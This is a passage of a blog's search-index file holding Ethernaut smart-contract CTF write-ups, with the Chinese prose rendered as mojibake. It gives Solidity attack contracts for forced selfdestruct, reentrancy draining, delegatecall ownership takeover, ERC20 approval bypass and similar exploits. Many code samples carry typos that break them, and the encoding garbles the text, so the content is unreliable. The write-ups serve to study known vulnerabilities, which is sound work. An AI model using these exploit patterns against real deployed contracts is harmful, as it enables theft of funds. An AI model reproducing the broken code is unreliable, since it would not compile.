title="Force"></a>Force</h2><p>è¦æ±‚æ˜¯ï¼Œä½¿è¿™ä¸ªåˆçº¦çš„ä½™é¢å¤§äºé›¶</p><p>åˆ†æï¼šä»£ç è¿˜æ˜¯å¾ˆç®€å•ï¼Œå°±æ˜¯ä¸€ä¸ªç©ºåˆçº¦ï¼Œä»€ä¹ˆå‡½æ•°ä¹Ÿæ²¡æœ‰ï¼Œå°±è€ƒè™‘åˆ°è‡ªæ¯åˆçº¦çš„åŠŸèƒ½  </p><blockquote><p>è‡ªæ¯åˆçº¦ï¼šè‡ªæ¯åˆçº¦æ˜¯ä¸€ç§æ™ºèƒ½åˆçº¦ï¼Œé€šå¸¸åŸºäºåŒºå—é“¾æŠ€æœ¯ï¼Œå…¶è®¾è®¡åˆè¡·æ˜¯åœ¨ç‰¹å®šæ¡ä»¶ä¸‹è‡ªåŠ¨æ‰§è¡ŒæŸäº›é¢„å®šçš„æ“ä½œï¼Œæœ€ç»ˆå°†åˆçº¦è‡ªèº«çš„åŠŸèƒ½æˆ–è€…å­˜å‚¨çš„èµ„äº§é”€æ¯ã€‚è¿™ç§åˆçº¦çš„è®¾è®¡å¯ä»¥ç¡®ä¿åœ¨ç‰¹å®šæƒ…å†µå‘ç”Ÿæ—¶ï¼Œä¾‹å¦‚æŸä¸ªæ—¶é—´ç‚¹åˆ°è¾¾ã€æŸä¸ªæ¡ä»¶è¾¾æˆæˆ–è€…ç‰¹å®šçš„äº‹ä»¶å‘ç”Ÿï¼Œåˆçº¦å†…éƒ¨çš„èµ„äº§æˆ–è€…ä»£ç å¯ä»¥è¢«æ°¸ä¹…åˆ é™¤æˆ–è€…æ— æ³•è®¿é—®ã€‚</p></blockquote><p>æ–¹æ³•ï¼šä½¿ç”¨é€šè¿‡selfdestructhåŠŸèƒ½åˆ é™¤ä¸€ä¸ªåˆçº¦ï¼Œåˆçº¦å†…æ‰€æœ‰çš„ä½™é¢å°†è¢«å¼ºåˆ¶å‘é€åˆ°å¦ä¸€ä¸ªåˆçº¦ï¼Œå°±æ˜¯å†™ä¸€ä¸ªæ”»å‡»åˆçº¦è‡ªæ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  constructor (address payable _target) payable&#123;</span><br><span class="line">      selfdestruct(_target);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éƒ¨ç½²æ”»å‡»åˆçº¦æ—¶è®°å¾—å‘é€1wei</p><hr><h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><p>è¦æ±‚æ˜¯ï¼Œè§£é”ä¿é™©ç®±</p><p>åˆ†æï¼špasswordæ˜¯ä¸ªç§æœ‰å˜é‡ï¼Œä¸èƒ½ç›´æ¥è·å–ï¼Œä½†æ˜¯å®ƒä¹Ÿæ˜¯ä¸ªçŠ¶æ€å˜é‡ï¼Œå¯ä»¥è®¿é—®çš„ï¼Œé€šè¿‡å›åˆ°ethernautç½‘ç«™ï¼Œåœ¨æ§åˆ¶å°è·å¾—å¯†ç å³å¯</p><p>æ–¹æ³•ï¼šåœ¨æ§åˆ¶å°è¾“å…¥ <code>await web3.eth.getStorageAt(contract.address,1)</code>, è·å¾—å¯†ç </p><hr><h2 id="king"><a href="#king" class="headerlink" title="king"></a>king</h2><p>è¦æ±‚æ˜¯ï¼Œç ´åæ¸¸æˆè§„åˆ™</p><p>åˆ†æï¼šé€šè¿‡åˆçº¦æ¥çœ‹å°±æ˜¯é˜»ç¢åˆ«äººè°ƒç”¨receiveå‡½æ•°,æ‹’æ¥åˆ«äººçš„è½¬è´¦,</p><p>æ–¹æ³•ï¼šå†™ä¸€ä¸ªæ”»å‡»åˆçº¦,ä¸è¦æœ‰fallback,receiveå‡½æ•°ï¼Œé˜²æ­¢æ–°ç©å®¶è½¬è´¦ï¼Œæˆä¸ºæ–°å›½ç‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  constructor (address payable target) payable&#123;</span><br><span class="line">      uint prize = King(target).prize();</span><br><span class="line">      (bool ok,)=target.call&#123;value: prize&#125;(&quot;&quot;);</span><br><span class="line">      require(ok,&quot;call failed&quot;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æ‰§è¡Œæ”»å‡»åˆçº¦æ—¶ï¼Œé¦–å…ˆæ£€æŸ¥å½“å‰çš„å¥–é‡‘å€¼ï¼Œç„¶åéƒ¨ç½²æ”»å‡»åˆçº¦æ—¶ï¼Œå‘é€è¯¥å¥–é‡‘å€¼</p><hr><h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><p>è¦æ±‚æ˜¯ï¼šçªƒå–åˆçº¦ä¸­çš„æ‰€æœ‰èµ„é‡‘</p><p>åˆ†æï¼šè¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„é‡å…¥æ”»å‡»  </p><blockquote><p>é‡å…¥æ”»å‡»ï¼šé‡å…¥æ”»å‡»çš„å…¸å‹ç¤ºä¾‹æ˜¯ä»¥å¤ªåŠçš„æ™ºèƒ½åˆçº¦ä¸­å‘ç”Ÿçš„æƒ…å†µã€‚ä»¥å¤ªåŠçš„æ™ºèƒ½åˆçº¦æ˜¯æŒ‰ç…§ä»¥å¤ªå¸ï¼ˆETHï¼‰çš„ä¼ ç»Ÿäº¤æ˜“æ–¹å¼æ‰§è¡Œçš„ï¼Œåˆçº¦å¯ä»¥è°ƒç”¨å…¶ä»–åˆçº¦æˆ–å‘é€ETHåˆ°å¤–éƒ¨è´¦æˆ·ã€‚å¦‚æœä¸€ä¸ªåˆçº¦åœ¨è°ƒç”¨å¤–éƒ¨åˆçº¦æ—¶å…ˆè½¬ç§»ETHç»™å¦ä¸€ä¸ªåˆçº¦ï¼Œå¹¶ä¸”åœ¨æ¥æ”¶ETHåå†æ‰§è¡Œå…¶ä»–é€»è¾‘ï¼Œé‚£ä¹ˆè¿™ä¸ªå¤–éƒ¨åˆçº¦å¯ä»¥åœ¨æ¥æ”¶ETHåè°ƒç”¨åŸåˆçº¦ï¼Œé‡æ–°æ‰§è¡Œå‘é€ETHçš„é€»è¾‘ï¼Œå¯¼è‡´é‡å¤çš„ETHè½¬ç§»ï¼Œä»è€Œé€ æˆèµ„é‡‘æŸå¤±ã€‚<br>é€šè¿‡ä¸æ–­è°ƒç”¨withdrawå‡½æ•°,çªƒå–èµ„é‡‘</p></blockquote><p>æ–¹æ³•: å†™ä¸€ä¸ªæ”»å‡»åˆçº¦</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier:   MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IReentrance &#123;</span><br><span class="line">  function donate(address) public payable;</span><br><span class="line">  function withdraw(uint256) public;</span><br><span class="line">&#125;</span><br><span class="line">contract Hack &#123;</span><br><span class="line">  IReetrance private immutable target;</span><br><span class="line"></span><br><span class="line">  constructor(address _target)&#123;</span><br><span class="line">    target = IReetrance(_target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function attack() external payable &#123;</span><br><span class="line">    target.donate&#123;value: 1e18&#125;(address(this));</span><br><span class="line">    target.withdraw(1e18);</span><br><span class="line">    require(address(target).balance == 0,&quot;target balance &gt;0&quot;);</span><br><span class="line">    selfdesctruct(paybale(msg.sender));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external paybale &#123;</span><br><span class="line">    uint prize = min(1e18,address(target).balance);</span><br><span class="line">    if(prize &gt; 0)&#123;</span><br><span class="line">    target.withdraw(prize);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function min(uint x,uint y) private pure returns(uint) &#123;</span><br><span class="line">     return x&lt;=y ? x:y;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éƒ¨ç½²æ”»å‡»åˆçº¦,è°ƒç”¨attackå‡½æ•°å‘é€1ether,å³å¯</p><hr><h2 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h2><p>è¦æ±‚æ˜¯,åˆ°è¾¾å»ºç­‘ç‰©çš„é¡¶æ¥¼</p><p>åˆ†æ:ç¬¬ä¸€æ¬¡çš„building.isLastFloor(_floor)è¦ä¸ºfalse,æ»¡è¶³ifçš„æ¡ä»¶,ç¬¬äºŒæ¬¡çš„building.isLastFloor(_floor)è¦ä¸ºture,ä½¿ç”µæ¢¯åˆ°æ¥¼é¡¶</p><p>æ–¹æ³•: å°±æ˜¯åœ¨æ”»å‡»åˆçº¦ä¸­å†™isLastFloorå‡½æ•°,è¾¾åˆ°è¦æ±‚,</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  Elevator private immutable target;</span><br><span class="line">  uint private count;</span><br><span class="line"></span><br><span class="line">  constructor (address _target)&#123;</span><br><span class="line">    target = Elevateor(_target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() external &#123;</span><br><span class="line">    target.goTo(1);</span><br><span class="line">    require(target.top(),&quot;NOT TOP&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function isLastFloor(uint) external returns(bool)&#123;</span><br><span class="line">    count++;</span><br><span class="line">    return count &gt; 1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><p>è¦æ±‚æ˜¯,è§£é”è¯¥åˆçº¦</p><p>åˆ†æ:å°±æ˜¯å°†lockedåˆå§‹å€¼ture,æ”¹ä¸ºfalse,è°ƒç”¨unlockå‡½æ•°</p><p>æ–¹æ³•: é¦–å…ˆè¦çŸ¥é“æ¯ä¸ªç§æœ‰çŠ¶æ€å¯å˜çš„å‚¨å­˜slot,å¦‚å›¾:<br>![è¿™æ˜¯å›¾ç‰‡](C:\Users\ASUS\blog\source\09afcfa44c4d7ce14ff699e10fd1a22c.jpg slot)<br>å†ä½¿ç”¨Webåº“æ¥è·å–è¿™ä¸ªæ•°æ®,ç„¶åæˆªå–ä¸º16å­—èŠ‚,å³ä¸ºå¯†é’¥,å†è°ƒç”¨unlockå‡½æ•°,å°†å…¶ä½œä¸ºå‚æ•°ä¼ é€’å³å¯</p><hr><h2 id="Naugth-Coin"><a href="#Naugth-Coin" class="headerlink" title="Naugth Coin"></a>Naugth Coin</h2><p>è¦æ±‚æ˜¯,å°†ä»£å¸ä½™é¢å˜ä¸ºé›¶</p><p>åˆ†æ:éš¾ç‚¹æœ‰ä¸ªæ—¶é—´é”,åœ¨è½¬ç§»ä»£å¸æ—¶,å¿…é¡»ç­‰å¾…10å¹´,æ‰€ä»¥å°±æ€è€ƒå…¶ä»–çš„æ–¹æ³•,ç„¶åå°±æ˜¯ç†Ÿæ‚‰ERC20åˆçº¦,ç›®æ ‡åˆçº¦importläº†ERC20,åé¢çš„æ”»å‡»åˆçº¦ä¹Ÿè¦ä½¿ç”¨,å»ºè®®å…ˆç†Ÿæ‚‰ERC20åˆçº¦å†æ¥è§£é¢˜,æˆ‘è¿™å°±ç›´æ¥ä¸Šæ”»å‡»åˆçº¦</p><p>æ–¹æ³•:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solodity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface INaughtCoin &#123;</span><br><span class="line"> function player() external view returns(address);</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line"> function balanceof(address account) external view returns (uint256);function approve(address spender, uint256 amount) external returns(bool);</span><br><span class="line"> function transferFrom(address sender,address recipient, uint256 amount)extlernal;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  //deploy</span><br><span class="line">  //coin.approve(hack,amount)</span><br><span class="line">  //pwn</span><br><span class="line">  function pwn(IERC20 coin) external &#123;</span><br><span class="line">    address player = INaughtCoin(address(coin)).player;</span><br><span class="line">    uint bal = coin.balanceOf(player);</span><br><span class="line">    coin.transferFrom(player,address(this),bal);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><p>è¦æ±‚æ˜¯,è·å¾—è¯¥åˆçº¦çš„æ‰€æœ‰æƒ</p><p>åˆ†æ:å§”æ‰˜è°ƒç”¨,æ³¨æ„çœ‹å‡½æ•°ç­¾å,<code>bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;))</code>,å½“æˆ‘ä»¬è°ƒç”¨setFirstTimeå‡½æ•°æ—¶,å§”æ‰˜è°ƒç”¨ä¼šæ‰§è¡ŒsetTimeå‡½æ•°,æ­¤æ—¶timeZone1Libraryçš„åœ°å€å°†ä¼šæ›´æ–°,å¦‚æœæˆ‘ä»¬å†æ¬¡è°ƒç”¨setFirstTimeå‡½æ•°,åˆæ›´æ–°åœ°å€,è¿™æ ·å°±èƒ½æˆä¸ºowner</p><p>æ–¹æ³•:è¿˜æ˜¯å†™ä¸€ä¸ªæ”»å‡»åˆçº¦,è¿›è¡Œè°ƒç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner;</span><br><span class="line">  uint256 storedTime;</span><br><span class="line"></span><br><span class="line">  function attack(Preservation target) external &#123;</span><br><span class="line">    target.setFistTime(uint256(uint160(address this)));</span><br><span class="line">    target.setFistTime(uint256(uint160(msg.sender)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function setTime(uint _owner) external &#123;</span><br><span class="line">    owner = address(uint160(_owner));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><p>è¦æ±‚æ˜¯,æ¢å¤ä¸¢å¤±çš„0.001ä»¥å¤ªå¸</p><p>åˆ†æ:è¿™æ˜¯ä¸€ä¸ªå·¥å‚åˆçº¦,ç”±äºä¸çŸ¥é“ä»£å¸çš„åœ°å€,æ— æ³•æ‰¾åˆ°ä¸¢å¤±çš„ä»¥å¤ªå¸,æ‰€ä»¥æˆ‘ä»¬çš„ä»»åŠ¡æ˜¯æ‰¾åˆ°è¿™ä¸ªä»£å¸åˆçº¦çš„åœ°å€,ç„¶åè¿›è¡Œè‡ªæ¯åˆçº¦,æœ‰ä¿©ç§æ–¹æ³•æ‰¾åˆ°ä»£å¸åˆçº¦çš„åœ°å€,ä¸€æ˜¯é€šè¿‡åŒºå—é“¾æµè§ˆå™¨Etherscan,æŸ¥è¯¢è°ƒç”¨generate Tokenäº¤æ˜“,æ‰¾åˆ°ä»£å¸åˆçº¦åœ°å€,äºŒæ˜¯é€šè¿‡è®¡ç®—,åœ¨Ethereum Stack Exchangeä¸Šå¯ä»¥æŸ¥è¯¢è®¡ç®—æ–¹å¼</p><p>æ–¹æ³•:é‡‡ç”¨è®¡ç®—åœ°å€çš„æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Dev&#123;</span><br><span class="line">  function recover(address sender) external pure returns (address) &#123;</span><br><span class="line">    address addr = address (uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6),bytes1(0x94),sender,bytes1(0x01))))));</span><br><span class="line">    return addr;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="MagicNunmber"><a href="#MagicNunmber" class="headerlink" title="MagicNunmber"></a>MagicNunmber</h2><p>è¦æ±‚æ˜¯,è°ƒç”¨whatIsTheMeaningOfLife()å‡½æ•°,å¹¶ä¸”è¿”å›æ•°å­—42,ä½†æ˜¯æ”»å‡»åˆçº¦ä¸èƒ½è¶…è¿‡10ä¸ªåˆçº¦</p><p>åˆ†æ:å¦‚æœç›´æ¥è°ƒç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack&#123;</span><br><span class="line">   function whatIsTheMeaningOfLife() external pure returns (uint)&#123;</span><br><span class="line">    return 42;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåˆçº¦å°†è¶…è¿‡10ä¸ªåˆçº¦ç ,ä¸ç¬¦åˆè¦æ±‚,è¿™æ—¶å°±ä½¿ç”¨æ±‡ç¼–ç¼–å†™ä¸€ä¸ªæ™ºèƒ½åˆçº¦,ç„¶åæ‰‹åŠ¨éƒ¨ç½²ä»£ç (æœ¬äººè¿˜åœ¨å­¦ä¹ æ±‡ç¼–è¯­è¨€)</p><hr><h2 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h2><p>è¦æ±‚æ˜¯,åœ¨æ‰€æœ‰è€…åœ¨è°ƒç”¨withdrawå‡½æ•°æ—¶æ‹’ç»å…¶æå–èµ„é‡‘</p><p>åˆ†æ:è¿™é¢˜å¤§æ¦‚æ€è·¯å¾ˆå¥½æ‡‚,å°±æ˜¯å¦‚ä½•å»å®ç°æ‹’ç»è½¬è´¦è¿™æ­¥è¦æ€è€ƒä¸€ä¸‹,åˆæ˜¯è¦ç”¨åˆ°æ±‡ç¼–è¯­è¨€,ç­‰æˆ‘å­¦ä¹ åå†æ¥è¡¥é¢˜è§£</p><hr><h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><p>è¦æ±‚æ˜¯ï¼Œä»¥ä½äºè¦ä»·çš„ä»·æ ¼ä»å•†åº—è´­ä¹°ç‰©å“</p><p>åˆ†æï¼šå°±æ˜¯ä½¿çŠ¶æ€å˜é‡isSoldç­‰äºtrueï¼Œè€Œä¸”è¿˜è¦ä½¿ä»·æ ¼ä½äº100ï¼Œç›®æ ‡åˆçº¦å·²ç»ç»™äº†ä¸€ä¸ªæ¥å£ï¼Œå°±æ˜¯å°±æ˜¯åœ¨è°ƒç”¨è¿™ä¸ªæ¥å£çš„æ—¶å€™æ»¡è¶³è¦æ±‚ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨çš„æ—¶å€™ï¼Œè¦ä½¿ä»·æ ¼é«˜äº100ï¼Œæ»¡è¶³ifçš„æ¡ä»¶ï¼Œç¬¬äºŒæ¬¡è°ƒç”¨çš„æ—¶å€™priceå°±è®¾ç½®ä½äº100çš„ä»·æ ¼å³å¯</p><p>æ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack&#123;</span><br><span class="line">  Shop private immutable target;</span><br><span class="line"></span><br><span class="line">   constructor (address _target)&#123;</span><br><span class="line">    target = Shop(_target);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   function pwn() external &#123;</span><br><span class="line">    target.buy();</span><br><span class="line">   &#125;</span><br><span class="line">   function price() external view returns (uint256)&#123;</span><br><span class="line">    //åˆ©ç”¨ç¬¬ä¸€æ¬¡è¿”å›isSoldä¸ºtureæ¥åŒºåˆ†ç¬¬å‡ æ¬¡è°ƒç”¨</span><br><span class="line">    if(isSold)</span><br><span class="line">      return 99;</span><br><span class="line">    else</span><br><span class="line">      return 100;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>é¶åœºé¢˜è§£</title>
      <link href="/2024/08/01/%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/"/>
      <url>/2024/08/01/%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><p>è¦æ±‚æ˜¯ï¼Œæˆä¸ºè¿™ä¸ªåˆçº¦çš„æ‰€æœ‰è€…ï¼Œå¹¶ä½¿è¿™ä¸ªåˆçº¦çš„é’±ä¸ºé›¶</p><p>é¦–å…ˆæ‰¾åˆ°ownerï¼Œ</p><p>åˆ†æ;<br>ä»è¿™ä¸ªåˆçº¦ä¸­å¯ä»¥çœ‹åˆ°ï¼Œè¦æˆä¸ºowner<br>1ï¼Œæˆ‘ä»¬çš„é’±å¿…é¡»å¤§äºåˆçº¦æŒæœ‰è€…çš„é’±ï¼Œä½†æ˜¯æœ€å¼€å§‹åˆçº¦æœ¬èº«å°±æœ‰1000etherï¼Œ<br>è¿™ä¸ªæ—¶å€™å°±èµ°contributeå‡½æ•°ä¸è¡Œï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰é‚£ä¹ˆå¤šé’±<br>2ï¼Œæ­¤æ—¶å‘ç°receiveï¼Œåªè¦æˆ‘ä»¬çš„é’±å’Œåˆçº¦çš„é’±å¤§äº0ï¼Œå°±å¯ä»¥æˆä¸ºè¿™ä¸ªåˆçº¦çš„æŒæœ‰è€…</p><p>æ–¹æ³•ï¼š<br>1ï¼Œåœ¨remixä¸Šéƒ¨ç½²è¿™ä¸ªåˆçº¦ï¼Œé¦–å…ˆè°ƒç”¨contributeå‡½æ•°ï¼Œç»™æˆ‘ä»¬è½¬è´¦ï¼›<br>2ï¼Œåœ¨è°ƒç”¨receiveå‡½æ•°ï¼Œå°±å®Œæˆäº†</p><h2 id="Fal1out"><a href="#Fal1out" class="headerlink" title="Fal1out"></a>Fal1out</h2><p>è¦æ±‚æ˜¯ï¼Œæˆä¸ºè¿™ä¸ªåˆçº¦çš„æ‰€æœ‰è€…</p><p>ä»è¿™ä¸ªé¢˜ç›®æ¥çœ‹ï¼ŒFallout,Fal1out,</p><p>åˆ†æï¼š<br>é¦–å…ˆçœ‹ä¸ownerç›¸å…³çš„å‡½æ•°ï¼Œå†å»åˆ†ææ„é€ çš„åˆçº¦åå­—Falloutï¼Œä»”ç»†å‘ç°æœ‰ä¸ªFal1outçš„å‡½æ•°ï¼Œå®ƒå®é™…ä¸Šæ˜¯å‘½åé”™è¯¯çš„ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥è°ƒåŠ¨è¿™ä¸ªå‡½æ•°ï¼Œåˆšå¥½æˆä¸ºåˆçº¦çš„æ‰€æœ‰è€…</p><p>æ–¹æ³•ï¼š</p><p>å®šä¹‰å‡½æ•°æ¥å£ï¼Œç›´æ¥è°ƒç”¨è¯¥å‡½æ•°Fal1out,æ­¤æ—¶å°±æˆä¸ºäº†åˆçº¦çš„æ‰€æœ‰è€…</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>my fist blog</title>
      <link href="/2024/08/01/my-fist-blog/"/>
      <url>/2024/08/01/my-fist-blog/</url>
      
        <content type="html"><![CDATA[<h2 id="å…ˆè¿›å…¥blog-cd-blog"><a href="#å…ˆè¿›å…¥blog-cd-blog" class="headerlink" title="å…ˆè¿›å…¥blog         cd blog"></a>å…ˆè¿›å…¥blog         cd blog</h2><h2 id="é¢„è§ˆhexo-hexo-s"><a href="#é¢„è§ˆhexo-hexo-s" class="headerlink" title="é¢„è§ˆhexo             hexo s"></a>é¢„è§ˆhexo             hexo s</h2><h2 id="åˆ›å»ºæ–‡ç« é¢˜ç›®-hexo-new-â€œâ€"><a href="#åˆ›å»ºæ–‡ç« é¢˜ç›®-hexo-new-â€œâ€" class="headerlink" title="åˆ›å»ºæ–‡ç« é¢˜ç›®        hexo new â€œâ€"></a>åˆ›å»ºæ–‡ç« é¢˜ç›®        hexo new â€œâ€</h2><h2 id="è¿›å…¥æ–‡ç« ç›®å½•-cd-æç›®å‰ï¼Œblogåçš„ä¸œè¥¿ï¼‰é¢˜ç›®-md"><a href="#è¿›å…¥æ–‡ç« ç›®å½•-cd-æç›®å‰ï¼Œblogåçš„ä¸œè¥¿ï¼‰é¢˜ç›®-md" class="headerlink" title="è¿›å…¥æ–‡ç« ç›®å½•        cd   æç›®å‰ï¼Œblogåçš„ä¸œè¥¿ï¼‰é¢˜ç›®.md"></a>è¿›å…¥æ–‡ç« ç›®å½•        cd   æç›®å‰ï¼Œblogåçš„ä¸œè¥¿ï¼‰é¢˜ç›®.md</h2><h2 id="å†™æ–‡ç« -notepad-é¢˜ç›®-md"><a href="#å†™æ–‡ç« -notepad-é¢˜ç›®-md" class="headerlink" title="å†™æ–‡ç«                   notepad é¢˜ç›®.md"></a>å†™æ–‡ç«                   notepad é¢˜ç›®.md</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/08/01/hello-world/"/>
      <url>/2024/08/01/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
